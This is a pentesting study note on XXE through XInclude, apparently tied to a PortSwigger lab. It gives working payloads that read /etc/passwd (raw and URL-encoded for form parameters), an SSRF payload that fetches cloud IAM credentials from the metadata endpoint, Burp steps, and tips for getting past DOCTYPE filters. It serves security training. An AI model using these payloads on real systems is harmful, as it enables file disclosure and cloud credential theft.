---
tags: [vapt, xxe, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.07 XXE via XInclude"
portswigger_labs: ["Exploiting XInclude to retrieve files"]
---

# 14.07 — XXE via XInclude

## What Is XInclude?

```
XInclude = XML Inclusions
W3C standard for including one XML document inside another.

Syntax:
  <xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
              href="file-to-include.xml"/>

WHY IT MATTERS FOR PENTESTERS:
  Classic XXE requires control over the DOCTYPE declaration.
  But sometimes your input is EMBEDDED into a larger XML document
  that the server controls — you can't control the DOCTYPE!
  
  XInclude works INSIDE element content — no DOCTYPE needed!
  If you control an XML element value, you can inject XInclude!
```

---

## XInclude File Read

```xml
<!-- BASIC XINCLUDE FILE READ: -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</foo>

<!-- READING FILE AS TEXT (when file isn't valid XML): -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>

<!-- IMPORTANT: parse="text" is needed for non-XML files!
     Without it: parser tries to parse file as XML → error if not valid XML!
     /etc/passwd is NOT valid XML → needs parse="text"
-->
```

---

## When XInclude Is Useful

```
SCENARIO: App embeds user input inside XML

  User input → app wraps it in XML:
  <data>
    <userInput>USER_CONTROLLED_VALUE</userInput>
  </data>
  
  Classic XXE: Can't add DOCTYPE (server controls the XML wrapper)
  
  BUT: If user controls element content:
  <data>
    <userInput>
      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include href="file:///etc/passwd" parse="text"/>
      </foo>
    </userInput>
  </data>
  
  → XInclude injects into the server's XML!
  → File contents included without DOCTYPE!
```

---

## XInclude in Form Parameters

```
PortSwigger Lab Scenario:
  POST /product/stock HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  productId=1&storeId=1
  
  App embeds productId into XML query to backend.
  No Content-Type: XML — it's a FORM POST!
  
  ATTACK:
  productId=<foo+xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include+href="file:///etc/passwd"+parse="text"/></foo>
  
  (URL encoded for form submission)
  
  → App embeds this in XML → XInclude processed → /etc/passwd returned!
  
  NOTE: Some apps convert form input to XML internally
        even though Content-Type is application/x-www-form-urlencoded!
```

---

## URL-Encoded XInclude Payload

```
FOR FORM PARAMETERS:

RAW:
  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>

URL ENCODED:
  %3Cfoo+xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude+href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22+parse%3D%22text%22%2F%3E%3C%2Ffoo%3E

IN BURP REPEATER:
  1. Find form parameter that gets embedded in XML
  2. Change value to XInclude payload
  3. URL encode: select all → Ctrl+U (URL encode selection)
  4. Send → check if /etc/passwd appears in response
```

---

## XInclude SSRF

```xml
<!-- XINCLUDE WITH HTTP URL FOR SSRF: -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" parse="text"/>
</foo>

<!-- → Server fetches metadata endpoint via XInclude!
     → Cloud credentials returned in response!
     Works even without DOCTYPE control!
-->
```

---

## XInclude vs Classic XXE

```
CLASSIC XXE:
  Requires: control over DOCTYPE declaration
  Best for: full XML body control (SOAP, API with XML body)
  
XINCLUDE:
  Requires: control over XML element content (not DOCTYPE)
  Best for: form parameters embedded in XML, JSON-to-XML conversion
  No DOCTYPE needed!
  Works even when DOCTYPE is stripped by a WAF/sanitizer!
  
WHEN TO USE XINCLUDE:
  ✓ You control a URL parameter, form field, or JSON value that gets embedded in XML
  ✓ App strips DOCTYPE declarations
  ✓ App validates XML schema (DTD-based) but still processes XInclude
  ✓ Any time classic XXE DOCTYPE approach fails
```

---

## Related Notes
- [[01 - What is XXE]] — fundamentals
- [[03 - Classic XXE File Read]] — DOCTYPE-based approach
- [[08 - XXE to SSRF]] — SSRF chains
- [[09 - XXE WAF Bypass]] — bypassing DOCTYPE filters
